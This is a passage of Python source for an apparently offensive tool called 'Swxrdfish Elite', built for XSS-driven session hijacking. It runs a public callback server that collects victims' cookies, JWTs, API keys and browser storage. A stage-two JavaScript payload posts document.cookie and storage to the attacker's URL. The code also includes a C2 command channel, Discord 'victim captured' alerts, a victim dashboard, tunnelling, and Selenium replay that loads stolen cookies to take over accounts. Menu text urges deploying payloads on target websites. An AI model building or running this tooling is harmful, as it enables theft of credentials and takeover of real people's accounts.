                        storage[storage_type][key] = value
                
                conn.close()
                return storage
            except Exception as e:
                self.logger.error(f"Failed to get victim storage: {e}")
                if conn:
                    conn.close()
                return {'localStorage': {}, 'sessionStorage': {}}
    
    def get_stats(self):
        """Get database statistics"""
        with self.lock:
            conn = None
            try:
                conn = self._get_connection()
                cursor = conn.cursor()
                
                cursor.execute('SELECT COUNT(*) FROM victims')
                total_victims = cursor.fetchone()[0]
                
                cursor.execute('SELECT COUNT(*) FROM tokens')
                total_tokens = cursor.fetchone()[0]
                
                conn.close()
                return {
                    'total_victims': total_victims,
                    'total_tokens': total_tokens
                }
            except Exception as e:
                self.logger.error(f"Failed to get stats: {e}")
                if conn:
                    conn.close()
                return {'total_victims': 0, 'total_tokens': 0}


class C2Manager:
    """Manages C2 commands for BeEF-style hooks"""
    
    def __init__(self):
        self.commands = {}
        self.lock = Lock()
        self.logger = logging.getLogger('swxrdfish')
    
    def set_command(self, victim_id, command):
        """Set command for specific victim"""
        with self.lock:
            self.commands[victim_id] = {
                'command': command,
                'timestamp': time.time()
            }
            self.logger.info(f"Command set for victim {victim_id}")
    
    def get_command(self, victim_id):
        """Get and clear command for victim"""
        with self.lock:
            cmd = self.commands.pop(victim_id, None)
            if cmd:
                self.logger.info(f"Command retrieved for victim {victim_id}")
            return cmd
    
    def cleanup_old_commands(self, max_age_seconds=300):
        """Remove commands older than max_age"""
        with self.lock:
            now = time.time()
            to_remove = [
                vid for vid, cmd in self.commands.items()
                if now - cmd['timestamp'] > max_age_seconds
            ]
            for vid in to_remove:
                del self.commands[vid]
            if to_remove:
                self.logger.info(f"Cleaned up {len(to_remove)} old commands")


class CollectorServer(BaseHTTPRequestHandler):
    """Enhanced collector server with rate limiting and C2"""
    
    database = None
    webhook_url = None
    rate_limiter = None
    c2_manager = None
    logger_instance = None
    
    def log_message(self, format, *args):
        """Override to use our logger"""
        pass
    
    def do_GET(self):
        try:
            client_ip = self.client_address[0]
            
            if CollectorServer.rate_limiter and not CollectorServer.rate_limiter.is_allowed(client_ip):
                if CollectorServer.logger_instance:
                    CollectorServer.logger_instance.warning(f"Rate limit exceeded for {client_ip}")
                self.send_error(429, "Too Many Requests")
                return
            
            if self.path.startswith('/c2'):
                self._handle_c2_request()
                return
            
            if self.path.startswith('/stage2.js'):
                self._handle_stage2_request()
                return
            
            self._handle_data_collection()
            
        except Exception as e:
            if CollectorServer.logger_instance:
                CollectorServer.logger_instance.error(f"GET request error: {e}")
            self.send_error(500, "Internal Server Error")
    
    def _handle_c2_request(self):
        """Handle C2 command polling"""
        try:
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            victim_id = params.get('id', [None])[0]
            
            if victim_id and CollectorServer.c2_manager:
                cmd = CollectorServer.c2_manager.get_command(victim_id)
                if cmd:
                    response = {'command': cmd['command']}
                else:
                    response = {}
            else:
                response = {}
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            if CollectorServer.logger_instance:
                CollectorServer.logger_instance.error(f"C2 request error: {e}")
            self.send_error(500)
    
    def _handle_stage2_request(self):
        """Handle multi-stage payload delivery"""
        try:
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            campaign = params.get('c', ['default'])[0]
            
            stage2_code = f'''
fetch("{self.server.callback_url}",{{
method:"POST",
headers:{{"Content-Type":"application/json"}},
body:JSON.stringify({{
cookies:document.cookie,
localStorage:Object.assign({{}},localStorage),
sessionStorage:Object.assign({{}},sessionStorage),
campaign:"{campaign}"
}})
}});
'''
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(stage2_code.encode())
            
        except Exception as e:
            if CollectorServer.logger_instance:
                CollectorServer.logger_instance.error(f"Stage2 request error: {e}")
            self.send_error(500)
    
    def _handle_data_collection(self):
        """Handle victim data collection from GET requests"""
        try:
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            
            if params:
                victim_data = {
                    'timestamp': datetime.now().isoformat(),
                    'ip': self.client_address[0],
                    'user_agent': self.headers.get('User-Agent', 'Unknown'),
                    'cookies': params.get('cookies', params.get('cookie', ['']))[0],
                    'campaign_id': params.get('campaign', ['default'])[0]
                }
                
                for key in params:
                    if key in ['jwt', 'token', 'auth', 'bearer', 'session', 'api_key', 'access_token']:
                        victim_data[key] = params[key][0]
                
                if CollectorServer.database:
                    victim_id = CollectorServer.database.add_victim(victim_data)
                    if victim_id and CollectorServer.logger_instance:
                        CollectorServer.logger_instance.success(
                            f"Victim #{victim_id} captured from {self.client_address[0]}"
                        )
                    
                    if CollectorServer.webhook_url and victim_id:
                        threading.Thread(
                            target=self._send_webhook,
                            args=(victim_data, victim_id),
                            daemon=True
                        ).start()
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'OK')
            
        except Exception as e:
            if CollectorServer.logger_instance:
                CollectorServer.logger_instance.error(f"Data collection error: {e}")
            self.send_error(500)
    
    def do_POST(self):
        try:
            client_ip = self.client_address[0]
            
            if CollectorServer.rate_limiter and not CollectorServer.rate_limiter.is_allowed(client_ip):
                if CollectorServer.logger_instance:
                    CollectorServer.logger_instance.warning(f"Rate limit exceeded for {client_ip}")
                self.send_error(429, "Too Many Requests")
                return
            
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 10 * 1024 * 1024:
                self.send_error(413, "Payload Too Large")
                return
            
            post_data = self.rfile.read(content_length)
            
            try:
                data = json.loads(post_data.decode('utf-8'))
            except Exception:
                data = {'raw': post_data.hex()[:1000]}
            
            victim_data = {
                'timestamp': datetime.now().isoformat(),
                'ip': self.client_address[0],
                'user_agent': self.headers.get('User-Agent', 'Unknown'),
                'cookies': data.get('cookies', ''),
                'campaign_id': data.get('campaign', 'default')
            }
            
            token_fields = ['jwt', 'token', 'auth_token', 'bearer', 'session_token', 
                          'api_key', 'access_token', 'refresh_token', 'csrf_token',
                          'localStorage', 'sessionStorage']
            
            for field in token_fields:
                if field in data:
                    victim_data[field] = data[field]
            
            if CollectorServer.database:
                victim_id = CollectorServer.database.add_victim(victim_data)
                if victim_id and CollectorServer.logger_instance:
                    CollectorServer.logger_instance.success(
                        f"Victim #{victim_id} captured (POST) from {client_ip}"
                    )
                
                if CollectorServer.webhook_url and victim_id:
                    threading.Thread(
                        target=self._send_webhook,
                        args=(victim_data, victim_id),
                        daemon=True
                    ).start()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())
            
        except Exception as e:
            if CollectorServer.logger_instance:
                CollectorServer.logger_instance.error(f"POST request error: {e}")
            self.send_error(500)
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def _send_webhook(self, victim_data, victim_id):
        """Send webhook notification"""
        try:
            payload = {
                "embeds": [{
                    "title": "New Victim Captured",
                    "color": 3066993,
                    "fields": [
                        {"name": "Victim ID", "value": str(victim_id), "inline": True},
                        {"name": "IP Address", "value": victim_data['ip'], "inline": True},
                        {"name": "Campaign", "value": victim_data['campaign_id'], "inline": True},
                        {"name": "Timestamp", "value": victim_data['timestamp'], "inline": False},
                        {"name": "Cookies", "value": str(victim_data.get('cookies', ''))[:100] + "...", "inline": False}
                    ],
                    "footer": {"text": "Swxrdfish Elite v3.1"}
                }]
            }
            
            requests.post(CollectorServer.webhook_url, json=payload, timeout=5)
        except Exception as e:
            if CollectorServer.logger_instance:
                CollectorServer.logger_instance.error(f"Webhook send failed: {e}")


if FLASK_AVAILABLE:
    dashboard_app = Flask(__name__)
    dashboard_db = None
    
    DASHBOARD_HTML = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Swxrdfish Elite - Dashboard</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Courier New', monospace;
                background: #0a0e27;
                color: #00ff00;
                padding: 20px;
            }
            .header {
                text-align: center;
                padding: 20px;
                border-bottom: 2px solid #00ff00;
                margin-bottom: 30px;
            }
            .header h1 {
                font-size: 2.5em;
                text-shadow: 0 0 10px #00ff00;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-card {
                background: #1a1f3a;
                border: 2px solid #00ff00;
                padding: 20px;
                border-radius: 5px;
                text-align: center;
            }
            .stat-value {
                font-size: 2em;
                font-weight: bold;
                color: #00ff00;
            }
            .stat-label {
                color: #888;
                margin-top: 5px;
            }
            .victims-table {
                width: 100%;
                border-collapse: collapse;
                background: #1a1f3a;
                border: 2px solid #00ff00;
            }
            .victims-table th {
                background: #00ff00;
                color: #0a0e27;
                padding: 12px;
                text-align: left;
            }
            .victims-table td {
                padding: 12px;
                border-bottom: 1px solid #333;
            }
            .victims-table tr:hover {
                background: #222844;
            }
            .token-badge {
                display: inline-block;
                background: #ff0000;
                color: white;
                padding: 2px 8px;
                border-radius: 3px;
                font-size: 0.9em;
            }
            .refresh-btn {
                background: #00ff00;
                color: #0a0e27;
                border: none;
                padding: 10px 20px;
                font-size: 1em;
                cursor: pointer;
                border-radius: 5px;
                font-weight: bold;
                margin: 10px;
            }
            .refresh-btn:hover {
                background: #00cc00;
            }
        </style>
        <script>
            function refreshData() {
                location.reload();
            }
            setInterval(refreshData, 10000);
        </script>
    </head>
    <body>
        <div class="header">
            <h1>SWXRDFISH ELITE</h1>
            <p>"See how far the rabbit hole goes..."</p>
            <button class="refresh-btn" onclick="refreshData()">Refresh</button>
        </div>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-value">{{ stats.total_victims }}</div>
                <div class="stat-label">Total Victims</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{{ stats.total_tokens }}</div>
                <div class="stat-label">Tokens Collected</div>
            </div>
            <div class="stat-card">
                <div class="stat-value">{{ recent_count }}</div>
                <div class="stat-label">Last 24 Hours</div>
            </div>
        </div>
        
        <h2 style="margin: 20px 0;">Captured Victims</h2>
        
        {% if victims %}
        <table class="victims-table">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Timestamp</th>
                    <th>IP Address</th>
                    <th>Campaign</th>
                    <th>Browser</th>
                    <th>Tokens</th>
                </tr>
            </thead>
            <tbody>
                {% for victim in victims %}
                <tr>
                    <td>#{{ victim.id }}</td>
                    <td>{{ victim.timestamp }}</td>
                    <td>{{ victim.ip }}</td>
                    <td>{{ victim.campaign }}</td>
                    <td>{{ victim.user_agent[:50] }}...</td>
                    <td><span class="token-badge">{{ victim.token_count }} tokens</span></td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
        {% else %}
        <p style="text-align: center; padding: 40px; color: #666;">No victims captured yet. Deploy your payloads!</p>
        {% endif %}
    </body>
    </html>
    '''
    
    @dashboard_app.route('/')
    def dashboard():
        if dashboard_db:
            victims = dashboard_db.get_all_victims()
            stats = dashboard_db.get_stats()
            
            recent_count = 0
            cutoff = datetime.now() - timedelta(hours=24)
            for victim in victims:
                try:
                    victim_time = datetime.fromisoformat(victim['timestamp'])
                    if victim_time > cutoff:
                        recent_count += 1
                except Exception:
                    pass
            
            return render_template_string(DASHBOARD_HTML, victims=victims, stats=stats, recent_count=recent_count)
        else:
            return "Database not initialized", 500
    
    @dashboard_app.route('/api/victims')
    def api_victims():
        if dashboard_db:
            victims = dashboard_db.get_all_victims()
            return jsonify(victims)
        return jsonify([])


class SessionReplay:
    """Session replay with proper cleanup"""
    
    def __init__(self, database):
        self.database = database
        self.logger = logging.getLogger('swxrdfish')
    
    def replay_session(self, victim_id, target_url):
        if not SELENIUM_AVAILABLE:
            return {'error': 'Selenium not available'}
        
        driver = None
        try:
            tokens = self.database.get_victim_tokens(victim_id)
            
            if not tokens:
                return {'error': 'No tokens found for victim'}
            
            options = Options()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            
            driver = webdriver.Chrome(options=options)
            driver.set_page_load_timeout(30)
            driver.get(target_url)
            
            parsed_url = urllib.parse.urlparse(target_url)
            domain = parsed_url.netloc
            
            for token in tokens:
                if token['type'] == 'cookie':
                    try:
                        driver.add_cookie({
                            'name': token['name'],
                            'value': token['value'],
                            'domain': domain
                        })
                    except Exception as e:
                        self.logger.warning(f"Failed to add cookie: {e}")
            
            driver.refresh()
            time.sleep(2)
            
            page_source = driver.page_source.lower()
            results = {
                'authenticated': False,
                'admin_access': False,
                'indicators': []
            }
            
            auth_indicators = ['logout', 'sign out', 'dashboard', 'profile', 'account']
            for indicator in auth_indicators:
                if indicator in page_source:
                    results['authenticated'] = True
                    results['indicators'].append(indicator)
                    break
            
            admin_indicators = ['admin', 'administrator', 'manage users', 'admin panel']
            for indicator in admin_indicators:
                if indicator in page_source:
                    results['admin_access'] = True
                    results['indicators'].append(f'ADMIN: {indicator}')
            
            screenshot_dir = 'swxrdfish_output'
            if not os.path.exists(screenshot_dir):
                os.makedirs(screenshot_dir)
            
            screenshot_path = os.path.join(
                screenshot_dir,
                f'session_replay_{victim_id}_{int(time.time())}.png'
            )
            driver.save_screenshot(screenshot_path)
            results['screenshot'] = screenshot_path
            
            return results
            
        except Exception as e:
            self.logger.error(f"Session replay failed: {e}")
            return {'error': str(e)}
        finally:
            if driver:
                try:
                    driver.quit()
                except Exception:
                    pass


class SwxrdfishElite:
    """Main application class with enhanced error handling"""
    
    def __init__(self, config_path='config.json'):
        self.config = ConfigManager(config_path)
        
        output_dir = self.config.get('output', 'directory', default='swxrdfish_output')
        log_file = self.config.get('output', 'log_file', default='swxrdfish.log')
        max_log_mb = self.config.get('output', 'max_log_size_mb', default=10)
        
        self.output_dir = output_dir
        self.logger = Logger(log_file, max_log_mb)
        
        db_path = self.config.get('database', 'path', default='swxrdfish_victims.db')
        self.database = VictimDatabase(db_path)
        
        self.jwt_exploiter = AdvancedJWTExploiter()
        self.tutorial = TutorialSystem()
        self.tunnel_manager = None
        self.session_replay = SessionReplay(self.database)
        self.payload_gen = AdvancedPayloadGenerator()
        self.c2_manager = C2Manager()
        self.beginner_mode = False
        
        self.server = None
        self.server_thread = None
        self.server_port = self.config.get('server', 'port', default=8000)
        self.callback_url = None
        
        rate_limit = self.config.get('security', 'rate_limit_per_ip', default=100)
        rate_window = self.config.get('security', 'rate_limit_window_seconds', default=60)
        self.rate_limiter = RateLimiter(rate_limit, rate_window)
        
        webhook_url = self.config.get('webhook', 'url', default='')
        webhook_enabled = self.config.get('webhook', 'enabled', default=False)
        self.webhook_url = webhook_url if webhook_enabled and webhook_url else None
        
        self.dashboard_thread = None
        self.dashboard_port = self.config.get('dashboard', 'port', default=5000)
        
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)
        
        self.cleanup_thread = None
        self.running = True
    
    def show_banner(self):
        os.system('clear' if os.name != 'nt' else 'cls')
        
        if FIGLET_AVAILABLE:
            banner = Figlet(font='slant')
            print(colored(banner.renderText('Swxrdfish'), 'green', attrs=['bold']))
        else:
            print()
            print(colored("="*75, 'green', attrs=['bold']))
            print(colored("              S W X R D F I S H   E L I T E                    ", 'green', attrs=['bold']))
            print(colored("="*75, 'green', attrs=['bold']))
            print()
        
        print(colored("="*75, 'red'))
        print(colored("           Session Hijacking & Persistent Victim Tracking              ", 'red'))
        print(colored("              \"See how far the rabbit hole goes...\"                    ", 'red'))
        print(colored("="*75, 'red'))
        
        if self.beginner_mode:
            print(colored("\n                    BEGINNER MODE ACTIVE", 'yellow', attrs=['bold']))
        
        if self.callback_url:
            print(colored(f"\nCallback URL: {self.callback_url}", 'green', attrs=['bold']))
        
        print()
    
    def show_menu(self):
        print(colored("\n" + "="*50, 'cyan'))
        print(colored("              MAIN MENU                         ", 'cyan', attrs=['bold']))
        print(colored("="*50 + "\n", 'cyan'))
        
        mode_indicator = " [Beginner]" if self.beginner_mode else ""
        
        print(colored(f"  [1] Start Public Callback Server{mode_indicator}", 'yellow'))
        print(colored(f"  [2] Generate Advanced Payloads{mode_indicator}", 'yellow'))
        print(colored(f"  [3] View Captured Victims{mode_indicator}", 'yellow'))
        print(colored(f"  [4] JWT Exploitation{mode_indicator}", 'yellow'))
        print(colored(f"  [5] Session Replay Auto Hijack", 'yellow'))
        print(colored(f"  [6] Web Dashboard", 'yellow'))
        print(colored(f"  [7] Configure Webhooks", 'yellow'))
        print(colored(f"  [8] Database Statistics", 'yellow'))
        print(colored(f"  [9] Toggle Beginner Mode (Currently: {'ON' if self.beginner_mode else 'OFF'})", 'magenta'))
        print(colored(f"  [0] Exit", 'yellow'))
        
        print(colored("\n" + "="*50, 'cyan'))
    
    def _generate_self_signed_cert(self):
        """Generate self-signed SSL certificate"""
        if not SSL_AVAILABLE:
            self.logger.error("SSL not available - install pyOpenSSL")
            return False
        
        try:
            from OpenSSL import crypto
            
            cert_file = self.config.get('server', 'cert_file', default='cert.pem')
            key_file = self.config.get('server', 'key_file', default='key.pem')
            
            if os.path.exists(cert_file) and os.path.exists(key_file):
                self.logger.info("SSL certificates already exist")
                return True
            
            k = crypto.PKey()
            k.generate_key(crypto.TYPE_RSA, 2048)
            
            cert = crypto.X509()
            cert.get_subject().C = "US"
            cert.get_subject().ST = "State"
            cert.get_subject().L = "City"
            cert.get_subject().O = "Swxrdfish"
            cert.get_subject().OU = "Security"
            cert.get_subject().CN = "localhost"
            cert.set_serial_number(1000)
            cert.gmtime_adj_notBefore(0)
            cert.gmtime_adj_notAfter(365*24*60*60)
            cert.set_issuer(cert.get_subject())
            cert.set_pubkey(k)
            cert.sign(k, 'sha256')
            
            with open(cert_file, "wb") as f:
                f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
            
            with open(key_file, "wb") as f:
                f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))
            
            self.logger.success("Self-signed SSL certificate generated")
            return True
            
        except Exception as e:
            self.logger.error(f"Failed to generate SSL certificate: {e}")
            return False
    
    def start_server_with_tunnel(self):
        if self.beginner_mode:
            self.tutorial.show_step(1, 4, "Understanding Public Callbacks")
            print(colored(self.tutorial.explain("callback_server", "beginner"), 'white'))
            self.tutorial.pause_for_user()
        
        self.logger.phase("Starting public callback infrastructure...")
        
        print(colored("\nTUNNEL OPTIONS:", 'cyan', attrs=['bold']))
        print(colored("  [1] Auto (Try ngrok, then cloudflare, then local)", 'yellow'))
        print(colored("  [2] Ngrok (Recommended - requires ngrok installed)", 'yellow'))
        print(colored("  [3] Cloudflare (Free - requires cloudflared installed)", 'yellow'))
        print(colored("  [4] Local only (No public URL)", 'yellow'))
        print()
        
        tunnel_choice = input(colored("[?] Select tunnel type (1-4): ", 'cyan')).strip()
        
        enable_https = self.config.get('server', 'enable_https', default=False)
        use_https = 'n'
        if enable_https:
            print()
            use_https = input(colored("[?] Enable HTTPS for callback server? (y/n): ", 'cyan')).strip().lower()
            if use_https == 'y':
                if not self._generate_self_signed_cert():
                    self.logger.warning("HTTPS disabled - falling back to HTTP")
                    enable_https = False
        
        print()
        webhook_input = input(colored("[?] Discord webhook URL (optional, press Enter to skip): ", 'cyan')).strip()
        if webhook_input:
            self.webhook_url = webhook_input
            CollectorServer.webhook_url = webhook_input
            self.config.set('webhook', 'url', value=webhook_input)
            self.config.set('webhook', 'enabled', value=True)
        
        print()
        self.logger.info("Initializing callback server...")
        
        CollectorServer.database = self.database
        CollectorServer.rate_limiter = self.rate_limiter
        CollectorServer.c2_manager = self.c2_manager
        CollectorServer.logger_instance = self.logger
        
        try:
            if enable_https and use_https == 'y':
                import ssl
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                cert_file = self.config.get('server', 'cert_file', default='cert.pem')
                key_file = self.config.get('server', 'key_file', default='key.pem')
                context.load_cert_chain(cert_file, key_file)
                
                self.server = HTTPServer(('0.0.0.0', self.server_port), CollectorServer)
                self.server.socket = context.wrap_socket(self.server.socket, server_side=True)
                protocol = "https"
            else:
                self.server = HTTPServer(('0.0.0.0', self.server_port), CollectorServer)
                protocol = "http"
            
            self.server.callback_url = None
            
            self.server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            self.server_thread.start()
            
            self.tunnel_manager = TunnelManager(self.server_port, self.config)
            
            if tunnel_choice == '2':
                self.callback_url = self.tunnel_manager.start_ngrok()
            elif tunnel_choice == '3':
                self.callback_url = self.tunnel_manager.start_cloudflared()
            elif tunnel_choice == '4':
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    local_ip = s.getsockname()[0]
                    s.close()
                except Exception:
                    local_ip = "127.0.0.1"
                self.callback_url = f"{protocol}://{local_ip}:{self.server_port}"
                self.tunnel_manager.tunnel_type = 'local'
            else:
                self.callback_url = self.tunnel_manager.start_auto()
            
            self.server.callback_url = self.callback_url
            
            print()
            print(colored("="*75, 'green'))
            print(colored("SERVER SUCCESSFULLY STARTED", 'green', attrs=['bold']))
            print(colored("="*75, 'green'))
            print()
            
            if self.tunnel_manager.tunnel_type == 'ngrok':
                print(colored("NGROK TUNNEL ACTIVE", 'green', attrs=['bold']))
            elif self.tunnel_manager.tunnel_type == 'cloudflare':
                print(colored("CLOUDFLARE TUNNEL ACTIVE", 'green', attrs=['bold']))
            else:
                print(colored("LOCAL NETWORK ONLY", 'yellow', attrs=['bold']))
            
            print()
            print(colored(f"Your Public Callback URL:", 'cyan', attrs=['bold']))
            print(colored(f"   {self.callback_url}", 'yellow', attrs=['bold']))
            print()
            
            if self.webhook_url:
                print(colored(f"Webhook notifications: ENABLED", 'green'))
                print()
            
            print(colored("NEXT STEPS:", 'cyan', attrs=['bold']))
            print(colored("   1. Use this URL in your XSS payloads (Menu Option 2)", 'white'))
            print(colored("   2. Deploy payloads on target websites", 'white'))
            print(colored("   3. Wait for victims - you'll see them appear here", 'white'))
            print(colored("   4. View captured data in Menu Option 3", 'white'))
            print(colored("   5. Open web dashboard (Menu Option 6) for GUI view", 'white'))
            print()
            
            if self.tunnel_manager.tunnel_type != 'local':
                print(colored("IMPORTANT: Keep this window open. Closing it stops the tunnel.", 'red', attrs=['bold']))
            
            print()
            input(colored("Press Enter to return to menu...", 'yellow'))
            
        except Exception as e:
            self.logger.error(f"Failed to start server: {str(e)}")
            print()
            input(colored("Press Enter to continue...", 'yellow'))
    
    def generate_advanced_payloads(self):
        if not self.callback_url:
            print(colored("\nWARNING: Callback server not running", 'red', attrs=['bold']))
            start_now = input(colored("[?] Start server now? (y/n): ", 'cyan')).strip().lower()
            if start_now == 'y':
                self.start_server_with_tunnel()
                return
            else:
                self.callback_url = "http://YOUR-SERVER:8000"
        
        self.logger.phase("Advanced Payload Generator")
        
        campaign_id = input(colored("[?] Campaign ID (default: default): ", 'cyan')).strip() or 'default'
        
        payloads = self.payload_gen.get_all_payloads(self.callback_url, campaign_id)
        
        print()
        print(colored("="*75, 'green'))
        print(colored("              ELITE PAYLOAD ARSENAL                             ", 'green', attrs=['bold']))
        print(colored("="*75, 'green'))
        print()
        
        for i, (name, payload) in enumerate(payloads.items(), 1):
            print(colored(f"[{i}] {name}", 'yellow', attrs=['bold']))
            print(colored(f"    {payload[:100]}...", 'white'))
            print()
        
        output_file = os.path.join(self.output_dir, f'elite_payloads_{campaign_id}_{int(time.time())}.txt')
        try:
            with open(output_file, 'w') as f:
                f.write(f"Campaign: {campaign_id}\n")
                f.write(f"Callback URL: {self.callback_url}\n")
                f.write(f"Generated: {datetime.now()}\n")
                f.write("="*75 + "\n\n")
                for name, payload in payloads.items():
                    f.write(f"{name}:\n{payload}\n\n{'='*75}\n\n")
            
            print(colored(f"Payloads saved to: {output_file}", 'green'))
        except Exception as e:
            self.logger.error(f"Failed to save payloads: {e}")
        
        print()
        input(colored("Press Enter to continue...", 'yellow'))
    
    def view_victims_enhanced(self):
        self.logger.info("Loading victim database...")
        print()
        
        victims = self.database.get_all_victims()
        
        if not victims:
            print(colored("NO VICTIMS CAPTURED YET", 'red', attrs=['bold']))
            print()
            print(colored("Make sure:", 'cyan'))
            print(colored("   - Callback server is running", 'white'))
            print(colored("   - Payloads have been deployed", 'white'))
            print(colored("   - Victims have triggered the XSS", 'white'))
        else:
            print(colored(f"CAPTURED {len(victims)} VICTIM(S)", 'green', attrs=['bold']))
            print(colored("="*75, 'green'))
            print()
            
            for victim in victims:
                print(colored(f"-- VICTIM #{victim['id']} " + "-"*50, 'cyan'))
                print(colored(f"", 'cyan'))
                print(colored(f" Time: {victim['timestamp']}", 'white'))
                print(colored(f" IP: {victim['ip']}", 'yellow'))
                print(colored(f" Browser: {victim['user_agent'][:60]}...", 'white'))
                print(colored(f" Campaign: {victim['campaign']}", 'white'))
                print(colored(f"", 'cyan'))
                
                tokens = self.database.get_victim_tokens(victim['id'])
                
                cookies = [t for t in tokens if t['type'] == 'cookie']
                jwt_tokens = [t for t in tokens if t['type'] in ['jwt', 'bearer', 'access_token', 'refresh_token']]
                api_keys = [t for t in tokens if t['type'] in ['api_key', 'token', 'auth_token']]
                
                if cookies:
                    print(colored(f" COOKIES ({len(cookies)}):", 'yellow'))
                    for token in cookies[:3]:
                        print(colored(f"    {token['name']}: {token['value'][:40]}...", 'white'))
                    if len(cookies) > 3:
                        print(colored(f"    ... and {len(cookies)-3} more", 'white'))
                
                if jwt_tokens:
                    print(colored(f" JWT/AUTH TOKENS ({len(jwt_tokens)}):", 'green'))
                    for token in jwt_tokens:
                        print(colored(f"    {token['type']}: {token['value'][:40]}...", 'green'))
                
                if api_keys:
                    print(colored(f" API KEYS ({len(api_keys)}):", 'yellow'))
                    for token in api_keys:
                        print(colored(f"    {token['type']}: {token['value'][:40]}...", 'yellow'))
                
                storage = self.database.get_victim_storage(victim['id'])
                if storage['localStorage']:
                    print(colored(f" localStorage ({len(storage['localStorage'])} items):", 'cyan'))
                    for key in list(storage['localStorage'].keys())[:3]:
                        value = storage['localStorage'][key]
                        print(colored(f"    {key}: {str(value)[:40]}...", 'white'))
                
                if storage['sessionStorage']:
                    print(colored(f" sessionStorage ({len(storage['sessionStorage'])} items):", 'cyan'))
                    for key in list(storage['sessionStorage'].keys())[:3]:
                        value = storage['sessionStorage'][key]
                        print(colored(f"    {key}: {str(value)[:40]}...", 'white'))
                
                print(colored(f"", 'cyan'))
                print(colored("-"*75, 'cyan'))
                print()
        
        print()
        input(colored("Press Enter to continue...", 'yellow'))
    
    def jwt_exploitation(self):
        self.logger.phase("JWT Exploitation Module")
        
        jwt_token = input(colored("[?] Enter JWT token: ", 'yellow')).strip()
        
        if not jwt_token:
            return
        
        print()
        self.logger.info("Running comprehensive analysis...")
        print()
        
        results = self.jwt_exploiter.analyze_comprehensive(jwt_token)
        
        if 'error' in results:
            self.logger.error(results['error'])
            print()
            input(colored("Press Enter to continue...", 'yellow'))
            return
        
        print(colored("="*75, 'cyan'))
        print(colored("JWT ANALYSIS RESULTS", 'green', attrs=['bold']))
        print(colored("="*75, 'cyan'))
        
        print(colored("\n[HEADER]", 'yellow', attrs=['bold']))
        print(colored(json.dumps(results['header'], indent=2), 'white'))
        
        print(colored("\n[PAYLOAD]", 'yellow', attrs=['bold']))
        print(colored(json.dumps(results['payload'], indent=2), 'white'))
        
        print(colored("\n[VULNERABILITIES]", 'red', attrs=['bold']))
        if results['vulnerabilities']:
            for vuln in results['vulnerabilities']:
                print(colored(f"  - {vuln}", 'red'))
        else:
            print(colored("  No vulnerabilities detected", 'green'))
        
        print(colored("\n[EXPLOITATION VECTORS]", 'yellow', attrs=['bold']))
        if results['exploitation_vectors']:
            for i, vector in enumerate(results['exploitation_vectors'], 1):
                print(colored(f"\n  [{i}] {vector['name']}", 'cyan', attrs=['bold']))
                print(colored(f"      Severity: {vector['severity']}", 'red' if vector['severity'] == 'CRITICAL' else 'yellow'))
                if 'description' in vector:
                    print(colored(f"      {vector['description']}", 'white'))
                if 'secret' in vector:
                    print(colored(f"      Secret: {vector['secret']}", 'green', attrs=['bold']))
        
        print(colored("\n[FORGED TOKENS]", 'green', attrs=['bold']))
        if results['forged_tokens']:
            for name, token in results['forged_tokens'].items():
                print(colored(f"\n  {name}:", 'yellow'))
                if token:
                    print(colored(f"  {token[:80]}...", 'white'))
        
        print(colored("\n" + "="*75, 'cyan'))
        print()
        input(colored("Press Enter to continue...", 'yellow'))
    
    def session_replay_menu(self):
        if not SELENIUM_AVAILABLE:
            self.logger.error("Selenium not installed. Install with: pip install selenium")
            print()
            input(colored("Press Enter to continue...", 'yellow'))
            return
        
        self.logger.phase("Session Replay & Auto Hijack")
        
        victims = self.database.get_all_victims()
        
        if not victims:
            self.logger.warning("No victims to replay")
            print()
            input(colored("Press Enter to continue...", 'yellow'))
            return
        
        print(colored("\nAvailable Victims:", 'cyan'))
        for victim in victims[:10]:
            print(colored(f"  [{victim['id']}] {victim['ip']} - {victim['timestamp']}", 'yellow'))
        
        victim_id = input(colored("\n[?] Enter victim ID to replay: ", 'cyan')).strip()
        target_url = input(colored("[?] Enter target URL: ", 'cyan')).strip()
        
        if not victim_id or not target_url:
            return
        
        try:
            victim_id = int(victim_id)
        except ValueError:
            self.logger.error("Invalid victim ID")
            print()
            input(colored("Press Enter to continue...", 'yellow'))
            return
        
        print()
        self.logger.info("Starting automated session hijack...")
        
        results = self.session_replay.replay_session(victim_id, target_url)
        
        print()
